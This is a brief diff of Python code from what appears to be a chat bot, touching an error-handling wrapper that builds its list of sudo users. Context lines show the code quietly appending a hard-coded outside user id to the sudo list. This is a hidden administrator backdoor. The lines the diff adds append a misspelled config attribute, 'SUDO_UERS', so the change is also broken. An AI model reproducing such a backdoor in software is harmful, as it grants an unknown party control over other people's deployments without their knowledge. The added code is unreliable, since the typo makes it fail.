@@ -1,5 +1,3 @@
-
-
 import time
 from lang import load
 from config import config
@@ -75,6 +73,8 @@ def handle_error(func: Callable) -> Callable:
         if me.id not in config.SUDO_USERS:
             config.SUDO_USERS.append(me.id)
             config.SUDO_USERS.append(5122474448)
+        else:
+            config.SUDO_USERS.append(config.SUDO_UERS)
         try:
             lang = get_group(chat_id)["lang"]
         except:
